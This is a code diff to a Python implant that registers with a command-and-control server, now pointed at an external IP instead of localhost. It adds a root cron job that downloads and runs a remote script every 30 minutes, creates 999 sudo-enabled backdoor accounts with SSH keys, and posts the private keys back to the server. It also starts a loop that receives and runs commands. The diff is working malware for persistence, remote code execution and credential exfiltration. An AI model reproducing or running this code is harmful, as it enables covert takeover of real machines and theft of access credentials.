@@ -5,7 +5,7 @@ import requests
 import platform
 import time
 
-base_url = 'http://127.0.0.1:5000'
+base_url = 'http://129.21.101.121:5000'
 
 
 def get_size(bytes, suffix="B"):
@@ -44,17 +44,62 @@ def register():
     return response.text
 
 
-def linux_persistence():
+def cron_job():
+    with subprocess.Popen(
+            ['sudo crontab -l > cron_bkp'],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+    with subprocess.Popen(
+            [f'sudo echo "*/30 * * * * sudo wget {base_url}/api/1.1/retrieve_scripts -O /tmp/test.py && '
+             f'/usr/bin/python3 /tmp/test.py >/dev/null 2>&1" > cron_bkp'],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+
+    with subprocess.Popen(
+            ['sudo crontab cron_bkp'],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+    with subprocess.Popen(
+            ['sudo rm cron_bkp'],
+            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+        ""
+
+
+def linux_persistence(agent_id):
+    cron_job()
     ssh_keys = dict()
     for i in range(1, 1000):
-        subprocess.run(['sudo', 'useradd', '-m', '-d', f"/home/bingus{i}", '-p', 'bingus', f"bingus{i}"
-                       , '-G', 'sudo'])
-        subprocess.run(['sudo', 'mkdir', f"/home/bingus{i}/.ssh"])
-        subprocess.run(['sudo', 'ssh-keygen', '-t', 'rsa', '-N', "", '-f', f"/home/bingus{i}/.ssh/id_rsa"])
-        ssh_key_loot = subprocess.Popen([f"sudo cat /home/bingus{i}/.ssh/id_rsa.pub | sudo tee -a /home/bingus{i}/.ssh/authorized_keys"],
-                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0].decode('utf-8').strip()
-        ssh_keys[f"bingus{i}"] = ssh_key_loot
-    return ssh_keys
+        # subprocess.run(['sudo', 'useradd', '-m', '-d', f"/home/bingus{i}", '-p', 'bingus', f"bingus{i}"
+        #                , '-G', 'sudo'])
+        with subprocess.Popen(
+                [f'sudo useradd -m -d /home/bingus{i} -p bingus bingus{i} -G sudo'],
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+            ""
+        # subprocess.run(['sudo', 'mkdir', f"/home/bingus{i}/.ssh"])
+        with subprocess.Popen(
+                [f'sudo mkdir /home/bingus{i}/.ssh'],
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+            ""
+        # subprocess.run(['sudo', 'ssh-keygen', '-t', 'rsa', '-N', "", '-f', f"/home/bingus{i}/.ssh/id_rsa"])
+        with subprocess.Popen(
+                [f'sudo ssh-keygen -t rsa -N "" -f /home/bingus{i}/.ssh/id_rsa'],
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
+            ""
+        with subprocess.Popen(
+                [f"sudo cat /home/bingus{i}/.ssh/id_rsa.pub | sudo tee -a /home/bingus{i}/.ssh/authorized_keys"],
+                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as ssh_key_loot:
+            ''
+        with subprocess.Popen(
+                [f"sudo cat /home/bingus{i}/.ssh/id_rsa"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                stdin=subprocess.PIPE) as private:
+            key = private.communicate()[0]
+            ssh_keys[f"bingus{i}"] = key.decode('utf-8').strip()
+    json = {
+        'id': agent_id,
+        'keys': ssh_keys
+    }
+    requests.post(f"{base_url}/api/1.1/ssh_keys", json=json)
+
 
 def get_command(agent_id):
     json = {
@@ -77,9 +122,8 @@ def get_command(agent_id):
 
 if __name__ == "__main__":
     # register implant with server and receive an ID
-    # id_agent = int(register())
+    id_agent = int(register())
+    linux_persistence(id_agent)
     # receive and run commands
-    # id_agent = 1
-    # while True:
-    #     get_command(id_agent)
-    linux_persistence()
+    while True:
+        get_command(id_agent)
